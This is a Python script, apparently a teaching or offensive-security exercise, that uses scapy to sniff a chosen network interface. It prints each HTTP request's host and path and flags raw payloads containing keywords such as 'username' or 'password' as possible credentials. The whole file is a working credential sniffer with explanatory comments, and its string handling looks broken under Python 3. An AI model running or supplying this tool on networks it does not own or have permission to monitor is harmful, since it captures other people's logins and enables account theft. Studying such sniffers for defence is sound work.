import scapy.all as scapy
from scapy.layers import http 
import argparse
import sys

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the interface to sniff")
    options = parser.parse_args()

    if not options.interface: #user did not put a value for target
        parser.error("[-] Please specify the interface to sniff. use --help for more info.")

    else:
        return options

def sniff(interface):

    # iface: interface to sniff on.
    # store: don't store packets in memory
    # prn: function to call each time a packet is captured
    try:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

    except:
        print("[-] Invalid interface. Please try again")
        sys.exit(0)


def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # this is where username and password is

        load = packet[scapy.Raw].load

        # list of keywords for username and password fields of websites
        keywords = ["username", "email", "uname", "user", "login", "pass", "password", "pw"]

        # look for keywords in the "load" field
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):

    # checks if the packet has a http layer plus a http request.
    # This is where we can sniff usernames, passwords, URLs etc.
    if packet.haslayer(http.HTTPRequest):

        #get URL. extract out the Host and Path fields from the http layer of the packet
        url = get_url(packet)
        print("[+] HTTP request >> " + url)

        login_info = get_login_info(packet)

        # check if the packet has any possible login info
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


options = get_argument()
sniff(options.interface)